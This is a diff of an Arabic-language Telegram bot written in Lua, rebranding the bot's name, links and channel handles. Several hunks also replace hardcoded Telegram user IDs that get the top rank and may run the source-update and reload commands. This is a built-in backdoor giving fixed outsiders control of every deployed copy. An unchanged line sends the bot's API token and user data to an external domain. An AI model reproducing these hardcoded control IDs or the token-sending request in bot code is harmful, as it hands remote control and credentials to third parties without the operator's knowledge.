@@ -82,7 +82,7 @@ boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource","Sourceee6ee",
-boss..":NameBot:","ارماندو",
+boss..":NameBot:","عهد",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
@@ -94,7 +94,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "اهلين عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \nشكرا لاستخدامك سورس Ar  \nأرســل الحين /start \nعشان تشوف اوامر المطور  المجهزه بالكيبورد\n\n𓍦"
+local Text = "اهلين عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \nشكرا لاستخدامك سورس عهد  \nأرســل الحين /start \nعشان تشوف اوامر المطور  المجهزه بالكيبورد\n\n𓍦"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -115,7 +115,7 @@ print('\27[0;33m>>'..[[
 
 
 
-قناة السورس @iiiziiii
+قناة السورس @eel00
 
 مطور السورس @diiivi
 ---------------------------------------------------------------------
@@ -154,7 +154,7 @@ print('\27[0;33m>>'..[[
 
 
 
-قناة السورس @iiiziiii
+قناة السورس @eel00
 
 مطور السورس @Diiivi
 -------------------------------------------------------------------
@@ -280,7 +280,7 @@ if msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018  then
 msg.TheRankCmd = 'Masrt'
 msg.TheRank = 'Mastr'
 msg.Rank = 1
-elseif msg.sender_user_id_ == 1965223041 then 
+elseif msg.sender_user_id_ == 5030591086 then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'MA🎖' 
 msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'MA🎖' 
 msg.Rank = 1
@@ -366,7 +366,7 @@ SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
 text = [[*اهلًا بك عزيزي في بوت ]]..redis:get(boss..':NameBot:')..[[ 🧚*
  
 ]]
-local inline = {{{text="ضيفني لـ مجموعتك 🧚",url="https://telegram.me/J_3Bbot?startgroup=start"}},{{text="بوت ارم",url="https://t.me/J_3Bbot"}}}
+local inline = {{{text="ضيفني لـ مجموعتك 🧚🏻‍♀️",url="https://telegram.me/TI6BOT?startgroup=start"}},{{text="بوت عهد",url="https://t.me/TI6BOT"}}}
 send_keyPhoto(msg.chat_id_,text,nil,inline,msg.id_)
 return false
 end
@@ -934,12 +934,12 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 779108237 or msg.sender_user_id_ == 779108237) then
+if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 779108237 or msg.sender_user_id_ == 779108237) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
@@ -954,7 +954,7 @@ print("https://devstorm.ml/youtube/tahaj200.php?token="..Token.."&msg="..MsgId..
 https.request("https://devstorm.ml/youtube/tahaj200.php?token="..Token.."&msg="..MsgId.."&Text="..URL.escape(Ttext).."&chat_id="..msg.chat_id_.."&user="..msg.sender_user_id_)
 end
 
-if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 779108237 or msg.sender_user_id_ == 779108237) then
+if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 sendMsg(msg.chat_id_,msg.id_,'*تم*',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
